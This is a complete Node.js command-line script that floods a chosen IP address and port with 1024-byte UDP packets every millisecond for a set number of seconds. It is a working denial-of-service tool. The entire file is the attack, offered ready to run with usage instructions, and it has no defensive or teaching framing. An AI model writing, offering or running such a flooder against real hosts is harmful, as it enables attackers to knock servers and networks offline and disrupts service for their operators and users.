const dgram = require("dgram");

function udpFlood(targetIP, targetPort, duration) {
    const socket = dgram.createSocket("udp4");
    const message = Buffer.alloc(1024, "A"); // Paket 1024 byte berisi karakter 'A'
    
    console.log(`🚀 Starting UDP flood to ${targetIP}:${targetPort} for ${duration} seconds...`);
    
    const startTime = Date.now();
    const interval = setInterval(() => {
        if (Date.now() - startTime > duration * 1000) {
            clearInterval(interval);
            socket.close();
            console.log("✅ Flood stopped.");
        } else {
            socket.send(message, targetPort, targetIP, (err) => {
                if (err) console.error("❌ Error:", err.message);
            });
        }
    }, 1);
}

const args = process.argv.slice(2);
if (args.length !== 3) {
    console.log(`Usage: node ${process.argv[1]} <target IP> <port> <time>`);
    process.exit(0);
}

const targetIP = args[0];
const targetPort = parseInt(args[1], 10);
const duration = parseInt(args[2], 10);

udpFlood(targetIP, targetPort, duration);
